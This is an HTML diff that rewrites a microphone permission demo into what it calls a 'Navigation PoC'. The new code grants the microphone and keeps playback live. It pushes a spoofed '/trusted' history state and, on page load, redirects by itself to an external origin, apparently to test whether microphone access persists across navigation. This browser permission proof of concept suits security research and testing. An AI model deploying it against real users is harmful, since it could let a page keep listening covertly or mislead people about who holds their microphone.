@@ -1,8 +1,8 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
 <meta charset="utf-8">
-<title>Microphone Permission Demo</title>
+<title>Microphone Permission Navigation PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -11,8 +11,7 @@ body {
   background:#f5f5f7;
   margin:0;
 }
-
-#panel {
+#box {
   max-width:520px;
   margin:60px auto;
   background:#fff;
@@ -20,7 +19,6 @@ body {
   border-radius:16px;
   box-shadow:0 20px 60px rgba(0,0,0,.2);
 }
-
 button {
   width:100%;
   padding:12px;
@@ -31,66 +29,74 @@ button {
   color:#fff;
   margin-top:12px;
 }
-
 pre {
   margin-top:12px;
   background:#111;
   color:#0f0;
   padding:10px;
   font-size:12px;
-  max-height:220px;
+  max-height:200px;
   overflow:auto;
-}
-.notice {
-  margin-top:12px;
-  font-size:13px;
-  color:#b00020;
 }
 </style>
 </head>
 
 <body>
 
-<div id="panel">
-  <h2>Microphone API Demo</h2>
-  <p>Click to request microphone permission</p>
+<div id="box">
+  <h2>Microphone Permission Navigation Test</h2>
+  <p>
+    1. Tap start<br>
+    2. Allow microphone<br>
+    3. Observe audio persists across navigation & history changes
+  </p>
 
-  <button onclick="useMicrophone()">Request Microphone</button>
-  <button onclick="redirect()">Redirect After Permission</button>
-
+  <button id="start">Start Test</button>
   <pre id="log"></pre>
-
-  <div class="notice">
-    Educational demo — browser permission required
-  </div>
 </div>
 
 <script>
-const log = m => apiLog.textContent += m + "\n";
-const apiLog = document.getElementById('log');
+const logEl = document.getElementById('log');
+const log = m => logEl.textContent += m + "\n";
 
-async function useMicrophone() {
+let stream;
+let ctx;
+
+document.getElementById('start').onclick = async () => {
+  log("Requesting microphone…");
+
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
-    log("Microphone: GRANTED");
+    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    log("Microphone granted");
 
-    // Simple playback (no manipulation)
-    const ctx = new AudioContext();
+    ctx = new AudioContext();
     const src = ctx.createMediaStreamSource(stream);
     src.connect(ctx.destination);
-
     log("Microphone playback active");
-  } catch {
-    log("Microphone: DENIED");
-  }
-}
 
-function redirect() {
-  log("Redirecting...");
-  setTimeout(() => {
-    location.href = "https://google.com:9090";
-  }, 80);
-}
+    // Simulate trusted in-app navigation
+    setTimeout(() => {
+      log("Pushing trusted history state");
+      history.pushState({}, '', '/trusted');
+      document.getElementById('box').style.display = 'block';
+    }, 200);
+
+  } catch (e) {
+    log("Microphone denied");
+  }
+};
+
+// Trigger navigation after page lifecycle events
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        log("Redirecting to external origin…");
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
